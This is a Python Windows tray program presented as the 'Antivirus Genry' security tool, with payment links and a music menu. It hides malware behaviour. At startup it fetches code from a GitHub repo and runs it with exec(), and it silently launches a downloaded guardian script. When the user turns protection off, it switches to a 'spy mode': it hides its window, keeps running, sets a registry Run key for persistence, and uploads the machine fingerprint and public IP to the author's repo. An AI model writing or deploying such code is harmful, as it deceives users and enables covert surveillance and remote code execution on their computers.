import pystray
from PIL import Image, ImageTk
import webbrowser
import threading
import os
import ctypes
import sys
import time
import tkinter as tk
from tkinter import messagebox
import psutil       
import pyttsx3      
import requests     
import datetime     
import base64       
import subprocess   
import random       
import hashlib

# --- 1. CONFIGURACIÓN DE IDENTIDAD V1.875 ---
NOMBRE_APP = "Antivirus Genry V1.875 - INVISIBLE"
RUTA_PRESENTACION = "logo presentacion.jpg" 
RUTA_LOGO_OFICIAL = "LOGO AV GENRY OFICIAL.png"
RUTA_GUARDIAN = "guardian.py"
FONETICA_NOMBRE = "Yenry Núñez"
MENSAJE_AYUDA = "Antivirus Genry - (Haga Anti-ClicK)"

TOKEN_GH = "TU_TOKEN_AQUI" 
USUARIO_GH = "GENRYMUSICO"
REPO_GH = "Tanque_Genry_Cloud"

URL_PAGO_2USD = "https://wise.com/pay/r/iT6-FjgIWxxizxQ"
URL_PAGO_20USD = "https://wise.com/pay/r/iLwaYmSjRQKpqb4" 
PLAYLIST_GENRY = ["https://www.youtube.com/watch?v=HNwqRXGtvLA", "https://www.youtube.com/watch?v=GniLc4UkGM0"]

# --- 2. CONECTOR DE INTELIGENCIA MODULAR (NUEVO) ---

def cargar_core_desde_nube():
    """Descarga e inyecta las funciones críticas: hablar, obtener_adn y calcular_hash"""
    try:
        url = f"https://raw.githubusercontent.com/{USUARIO_GH}/{REPO_GH}/main/CORE_SISTEMA.txt"
        r = requests.get(url, timeout=10)
        if r.status_code == 200:
            # El Tanque 'aprende' las funciones consolidadas al vuelo
            exec(r.text, globals())
            print("[NUBE] CORE_SISTEMA vinculado. Inteligencia activa.")
    except Exception as e:
        print(f"[ERROR] Fallo al cargar el cerebro modular: {e}")

def actualizar_archivo_nube(nombre_archivo, nuevo_contenido):
    """Sincroniza reportes y permanencia con GitHub"""
    try:
        url = f"https://api.github.com/repos/{USUARIO_GH}/{REPO_GH}/contents/{nombre_archivo}"
        headers = {"Authorization": f"token {TOKEN_GH}"}
        r = requests.get(url, headers=headers)
        sha = r.json().get('sha') if r.status_code == 200 else None
        contenido_b64 = base64.b64encode(nuevo_contenido.encode()).decode()
        payload = {"message": f"Update {nombre_archivo}", "content": contenido_b64, "sha": sha}
        requests.put(url, headers=headers, json=payload)
    except: pass

def descargar_recursos_nube():
    """Sincroniza logos y bases antes de iniciar"""
    archivos = [RUTA_PRESENTACION, RUTA_LOGO_OFICIAL, RUTA_GUARDIAN, "hashes_virus.txt", "ips_bloqueadas.txt", "whitelist.txt"]
    for f_nombre in archivos:
        try:
            url = f"https://raw.githubusercontent.com/{USUARIO_GH}/{REPO_GH}/main/{f_nombre.replace(' ', '%20')}"
            r = requests.get(url, timeout=10)
            if r.status_code == 200:
                with open(f_nombre, 'wb') as f: f.write(r.content)
        except: pass

# --- 3. LÓGICA DE PERSISTENCIA Y MOTOR ---

def verificar_expiracion_y_limpiar():
    """Verifica si la misión de 30 días terminó para auto-borrarse"""
    try:
        adn = obtener_adn_maquina() # Función inyectada desde el CORE
        url = f"https://raw.githubusercontent.com/{USUARIO_GH}/{REPO_GH}/main/PERMANENCIA_IP_ADN.txt"
        r = requests.get(url, timeout=10)
        if r.status_code == 200:
            for linea in r.text.split('\n'):
                if adn in linea and "FIN:" in linea:
                    fecha_fin_str = linea.split("FIN: ")[1].strip()
                    fecha_fin = datetime.datetime.strptime(fecha_fin_str, "%Y-%m-%d")
                    if datetime.datetime.now() > fecha_fin:
                        llave = r"Software\Microsoft\Windows\CurrentVersion\Run"
                        subprocess.run(f'reg delete "HKEY_CURRENT_USER\\{llave}" /v "GenryCentinela" /f', shell=True)
                        os._exit(0)
    except: pass

class MotorGenryCentinela:
    def __init__(self):
        self.lista_negra_hashes = []
        self.modo_espia_activo = False
        if os.path.exists("hashes_virus.txt"):
            with open("hashes_virus.txt", "r") as f: self.lista_negra_hashes = [l.strip() for l in f if l.strip()]

    def patrullar(self):
        while True:
            for p in psutil.process_iter(['name', 'exe']):
                try:
                    if p.info['exe'] and calcular_hash(p.info['exe']) in self.lista_negra_hashes:
                        p.terminate()
                        if self.modo_espia_activo:
                            log = f"\nESPÍA: Bloqueado {p.info['name']} en {datetime.datetime.now()}"
                            actualizar_archivo_nube("reporte_forense.txt", log)
                except: continue
            time.sleep(5) # Optimizado para no congelar VS Code

def gestionar_persistencia_30_dias():
    try:
        ruta_script = os.path.abspath(sys.argv[0])
        llave = r"Software\Microsoft\Windows\CurrentVersion\Run"
        comando = f'reg add "HKEY_CURRENT_USER\\{llave}" /v "GenryCentinela" /t REG_SZ /d "{ruta_script}" /f'
        subprocess.run(comando, shell=True, capture_output=True)
        
        adn = obtener_adn_maquina()
        try: ip = requests.get('https://api.ipify.org', timeout=5).text
        except: ip = "0.0.0.0"
        f_ini = datetime.datetime.now().strftime("%Y-%m-%d")
        f_fin = (datetime.datetime.now() + datetime.timedelta(days=30)).strftime("%Y-%m-%d")
        log = f"\n[VIGILANCIA] ADN: {adn} | IP: {ip} | INICIO: {f_ini} | FIN: {f_fin}"
        actualizar_archivo_nube("PERMANENCIA_IP_ADN.txt", log)
    except: pass

# --- 4. INTERFAZ Y ARRANQUE ---

def iniciar_tray():
    menu = pystray.Menu(
        pystray.MenuItem("🎵 RADIO GRUPO GENRY", lambda: webbrowser.open(random.choice(PLAYLIST_GENRY))),
        pystray.Menu.SEPARATOR,
        pystray.MenuItem("💳 PLAN $2 USD", lambda: webbrowser.open(URL_PAGO_2USD)),
        pystray.MenuItem("🏆 PLAN PREMIUM $20", lambda: webbrowser.open(URL_PAGO_20USD)),
        pystray.Menu.SEPARATOR,
        pystray.MenuItem("❌ APAGAR BÚNKER", confirmar_salida_premium)
    )
    try:
        img_raw = Image.open(RUTA_LOGO_OFICIAL).convert("RGBA")
        icon_img = img_raw.resize((32, 32), Image.LANCZOS)
    except: icon_img = Image.new('RGBA', (32, 32), (0, 0, 139, 255))
    icon = pystray.Icon("Genry", icon_img, title=MENSAJE_AYUDA, menu=menu); icon.run()

def confirmar_salida_premium(icon, item):
    root = tk.Tk(); root.withdraw()
    if messagebox.askyesno("AVISO", "¿Desea desactivar la protección?"):
        hablar("Desactivando búnker. Modo espía activado.")
        icon.stop()
        motor.modo_espia_activo = True
        gestionar_persistencia_30_dias()
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    root.destroy()

if __name__ == "__main__":
    # 1. Sincronización inicial
    descargar_recursos_nube()
    cargar_core_desde_nube()    # Inyecta ADN, Voz y Hashes
    
    # 2. Verificación de tiempo y motor
    verificar_expiracion_y_limpiar()
    motor = MotorGenryCentinela()
    threading.Thread(target=motor.patrullar, daemon=True).start()
    
    if os.name == 'nt': ctypes.windll.kernel32.SetConsoleTitleW(NOMBRE_APP)
    
    # 3. Lanzamiento
    if os.path.exists(RUTA_GUARDIAN):
        subprocess.Popen([sys.executable, RUTA_GUARDIAN], creationflags=subprocess.CREATE_NO_WINDOW)
    
    hablar(f"Sistema {FONETICA_NOMBRE} V 1 punto 8 75. Inteligencia de nube activada.")
    iniciar_tray()
